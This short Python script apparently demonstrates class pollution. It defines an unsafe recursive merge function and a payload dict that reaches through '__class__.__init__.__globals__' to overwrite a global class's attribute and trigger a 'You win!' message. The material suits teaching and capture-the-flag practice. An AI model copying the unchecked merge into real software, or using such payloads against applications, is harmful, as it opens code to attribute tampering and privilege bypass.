class BaseClass:
    pass

class VulnClass:
    def __init__(self):
        pass

class WinClass(BaseClass):
    def checkWin(self):
        if self.win == "win":
            print("You win!")

def merge(tornado, updated):
    for index, value in tornado.items():
        if hasattr(updated, "__getitem__"):
            if updated.get(index) and type(value) == dict:
                merge(value, updated.get(index))
            else:
                updated[index] = value
        elif hasattr(updated, index) and type(value) == dict:
            merge(value, getattr(updated, index))
        else:
            setattr(updated, index, value)

payload = {
    '__class__': {
        '__init__': {
            '__globals__': {
                'WinClass' : {
                    'win': 'win',
                }
            }
        }
    }
}

A = VulnClass()
merge(payload, A)

print(A.__getattribute__)
B = WinClass()
B.checkWin()